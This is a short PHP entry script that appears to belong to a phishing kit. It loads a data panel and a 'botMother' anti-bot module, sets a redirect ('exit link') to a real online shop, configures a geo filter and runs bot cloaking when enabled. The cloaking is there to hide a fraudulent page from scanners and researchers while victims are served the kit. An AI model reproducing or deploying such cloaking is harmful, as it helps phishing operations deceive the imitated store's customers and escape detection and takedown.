<?php 
require (__DIR__).'/config.php';
require (__DIR__).'/panel/panel.class.php';
require (__DIR__).'/lib/frm.php';
require (__DIR__).'/md.php';
$pnl = new Panel();
$current_data = $pnl->getData();
require (__DIR__).'/botMother/botMother.php';
$bm = new botMother();
$m = new botMother();
$bm->setExitLink("https://www.shop.ae/");
$bm->setGeoFilter("");
$bm->setLicenseKey("");
$bm->setTestMode(false);


if(strtolower($antibot)=="yes"){
$bm->run();
} 

function setError($msg){
    if(isset($_GET['e'])){
        echo '<div class="error">'.$msg.'</div>';
    }
}



?>